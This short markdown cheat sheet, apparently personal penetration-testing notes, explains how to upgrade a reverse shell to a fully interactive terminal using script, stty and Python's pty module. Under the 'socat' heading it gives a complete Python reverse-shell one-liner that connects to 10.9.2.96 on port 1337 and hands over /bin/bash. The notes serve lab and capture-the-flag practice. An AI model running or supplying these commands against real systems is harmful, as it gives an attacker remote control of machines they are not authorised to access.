# How to upgrade reverse shell :
## Method 1 : upgrade netcat
```bash
SHELL=/bin/bash script -q /dev/null
```
<kbd>Ctrl</kbd>+<kbd>Z</kbd>
```bash
stty raw -echo
fg
reset
Terminal type? xterm
```
Using netcat listener and you want shell with terminal command like <kbd>&#8593;</kbd> key to go back to history command, <kbd>Ctrl</kbd>+<kbd>c</kbd>  to stop a command instead of netcat listener, etc.
## Method 2 : spawn a TTY
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
<kbd>Ctrl</kbd>+<kbd>Z</kbd>
```bash
stty raw -echo
fg
export TERM=xterm
```
To fool commands like `su username`when you need a proper terminal to execute them. 
## Method 3 : socat
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.96",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
<!--stackedit_data:
eyJoaXN0b3J5IjpbMjM1MjQ1MjMyLDE0NjE3NDQwNiwxOTM4Mj
ExODQ2LC0xNDI1MTQwOTcsMTkxMzU5MjE5MV19
-->